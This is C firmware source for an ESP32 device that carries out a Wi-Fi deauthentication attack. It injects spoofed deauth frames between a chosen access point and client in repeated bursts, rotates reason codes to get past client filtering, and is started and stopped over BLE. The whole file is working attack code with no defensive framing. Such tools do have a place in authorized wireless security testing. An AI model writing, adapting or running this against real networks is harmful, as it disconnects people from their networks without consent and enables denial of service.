#include "classic_deauth.h"
#include "esp_rom_sys.h"   // esp_rom_delay_us

static const char* TAG = "CLASSIC_DEAUTH";

// Wrapper for send_deauth_packets in a task function
static void deauth_task(void *vParameters) {
    // Retrieve targets
    const uint8_t *target_ap = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();

    send_deauth_packets(target_ap, target_client);

    deauth_set_task_handle(NULL);
    vTaskDelete(NULL); // Delete this task when done
}


void send_deauth_packets(const uint8_t *ap_mac, const uint8_t *client_mac) {
    int attack_channel = deauth_get_attack_channel();
    ESP_LOGI(TAG, "Sending deauth on channel %d", attack_channel);
    ESP_LOGI(TAG, "AP:     %02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    prepare_for_injection();

    unsigned long start = esp_timer_get_time() / 1000000;
    uint8_t packet[26];
    int total_count   = 0;
    int success_count = 0;
    const int MAX_RETRIES = 3;

    // Bypass client filtering with different Reason codes
    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
    const int reason_count = sizeof(reason_codes);

    while (deauthActive) {
        for (int burst = 0; burst < 3; burst++) {
            uint8_t reason = reason_codes[(total_count + burst) % reason_count];

            // ===== AP -> Client =====
            build_deauth_packet(packet, client_mac, ap_mac, ap_mac, reason);
            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
            esp_rom_delay_us(800);   // gap fin (indépendant du tick FreeRTOS)

            // ===== Client -> AP =====
            build_deauth_packet(packet, ap_mac, client_mac, ap_mac, reason);
            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
            esp_rom_delay_us(800);
        }

        // Inter-burst : yield pour nourrir le watchdog et la pile BLE
        vTaskDelay(pdMS_TO_TICKS(10));

        if ((total_count + 1) % 10 == 0) {
            unsigned long elapsed = (esp_timer_get_time() / 1000000) - start;
            char result[256];
            snprintf(result, sizeof(result),
                     "LOG|DEAUTH|msg=Progress: %d bursts, %d packets (elapsed=%lus)",
                     total_count + 1, success_count, elapsed);
            ESP_LOGI(TAG, "%s", result);
            BleManager_SendStatus(result);
        }
        total_count++;
    }

    isAttackActive = false;
    ESP_LOGI(TAG, "Attack complete: %d packets sent", success_count);
    vTaskDelay(pdMS_TO_TICKS(200));
    restore_wifi_state();
}

void start_deauth_attack(char *target, char *ap, int channel) {
    if(deauthActive) {
        ESP_LOGW(TAG, "Deauth already running");
        return;
    }

    if (deauth_get_task_handle() != NULL) {
        ESP_LOGW(TAG, "Deauth task already exists");
        return;
    }

    ESP_LOGI(TAG, "DEAUTH target=%s ap=%s ch=%d", target, ap, channel);

    uint8_t target_mac[6];
    uint8_t ap_mac[6];

    if (!mac_str_to_bytes(target, target_mac)) {
        ESP_LOGE(TAG, "Invalid TARGET MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_TARGET_MAC");
        return;
    }

    if (!mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid AP MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_AP_MAC");
        return;
    }

    // set target and AP (target_client, target_ap)
    set_deauth_targets(ap_mac, target_mac);
    // set channel (attack_channel)
    set_deauth_channel(channel);

    deauthActive = true;
    isAttackActive = true;

    TaskHandle_t handle = NULL;

    // Calling task freeRTOS
    xTaskCreate(
        deauth_task,
        "deauth_task",
        4096,
        NULL,
        5,  // Priority less than ble
        &handle
    );
    deauth_set_task_handle(handle);
    
    ESP_LOGI(TAG, "Deauth task created");
}

void stop_deauth_attack() {
    if(!deauthActive) return;

    // Arrêt COOPÉRATIF : on lève les drapeaux et on laisse la tâche (classic,
    // steal ou test) sortir de sa boucle et se nettoyer elle-même
    // (restore_wifi_state + handle=NULL + vTaskDelete(NULL)). On ne tue JAMAIS
    // la tâche en plein esp_wifi_80211_tx (ce qui corrompait le driver WiFi).
    deauthActive  = false;
    captureActive = false;

    ESP_LOGI(TAG, "Stopping attack (cooperative)...");

    // Attendre la sortie propre (jusqu'à 5 s)
    int wait_count = 0;
    while (deauth_get_task_handle() != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }

    // Filet de sécurité : si la tâche est réellement bloquée, dernier recours
    TaskHandle_t handle = deauth_get_task_handle();
    if (handle != NULL) {
        ESP_LOGW(TAG, "Task did not exit in time, forcing cleanup");
        vTaskDelete(handle);
        deauth_set_task_handle(NULL);
        restore_wifi_state();
    }

    ESP_LOGI(TAG, "Deauth STOPPED");
}